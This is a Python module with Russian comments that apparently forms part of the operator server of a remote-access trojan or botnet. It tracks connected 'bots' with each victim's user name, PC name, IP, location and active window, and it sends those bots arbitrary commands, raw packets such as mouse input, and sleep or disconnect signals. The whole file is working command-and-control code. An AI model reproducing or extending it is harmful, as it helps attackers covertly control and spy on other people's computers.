from logs import Log as logger

# ==========================================
# БЛОК 1: ГЛОБАЛЬНЫЕ РЕЕСТРЫ СОЕДИНЕНИЙ
# ==========================================
client = {}  # {id: (reader, writer)}
client_info = {}  # {id: metadata_dict}
fsmap = {}  # {id: file_system_cache}

# =================== Основные команды ===================

async def close_client(client_id: str, send_sleep: bool = True) -> bool:
    """Отключает одного клиента. Возвращает True если клиент был отключён."""
    if client_id in client:
        _, writer = client[client_id]
        if send_sleep:
            try:
                writer.write(b"sleep\n")
                await writer.drain()
            except Exception as e:
                logger.warning(f"[!] Failed to send sleep to {client_id}: {e}")
        try:
            writer.close()
            await writer.wait_closed()
        except Exception as e:
            logger.warning(f"[!] Failed to close writer for {client_id}: {e}")

        client.pop(client_id, None)
        client_info.pop(client_id, None)
        fsmap.pop(client_id, None)
        logger.info(f"[*] Client {client_id} disconnected")
        return True
    else:
        logger.warning(f"[!] Client {client_id} not found")
        return False


async def close_all_client() -> int:
    """Отключает всех клиентов. Возвращает количество отключённых."""
    count = 0
    for cid in list(client.keys()):
        if await close_client(cid):
            count += 1
    return count


def list_clients() -> list[dict]:
    """
    Возвращает список подключённых клиентов в виде словарей,
    с полями, необходимыми для отображения на фронтенде и в CLI.
    """
    client_list = []
    for cid, info in client_info.items():
        client_list.append({
            "id": info.get("id", "N/A"),
            "status": info.get("status", "offline"),

            # Поля для таблицы (Фронтенд):
            "loc": info.get("loc", "?"),
            "user": info.get("user", "?"),
            "pc_name": info.get("pc_name", "?"),
            "last_active": info.get("last_active", "?"), # ⬅️ ИСПРАВЛЕНИЕ: lastActive -> last_active
            "ip": info.get("ip", "?"),
            "activeWindow": info.get("activeWindow", ""),

            # Поля, необходимые для отображения в CLI (оператор_интерфейс):
            "os": info.get("os", "N/A"),
            "arch": info.get("arch", "N/A")
        })
    return client_list


async def send_command(cid: str, command: str) -> bool:
    """Отправляет произвольную команду клиенту. Возвращает True при успехе."""
    if cid in client:
        _, writer = client[cid]
        try:
            writer.write(f"{command}\n".encode())
            await writer.drain()
            logger.info(f"[*] Command '{command}' sent to {cid}")
            return True
        except Exception as e:
            logger.error(f"[!] Failed to send '{command}' to {cid}: {e}")
            return False
    else:
        logger.warning(f"[!] Client {cid} not found")
        return False


async def send_binary_to_bot(bot_id: str, packet: bytes) -> bool:
    """
    Универсальный проброс байтов от API/CLI напрямую в сокет бота.
    """
    if bot_id in client:
        try:
            _, writer = client[bot_id]
            writer.write(packet)
            # Для потоковых данных (мышь) drain() может создавать задержку.
            # Но для надежности команд он необходим.
            await writer.drain()
            return True
        except Exception as e:
            logger.error(f"[Services] Ошибка отправки боту {bot_id}: {e}")
    return False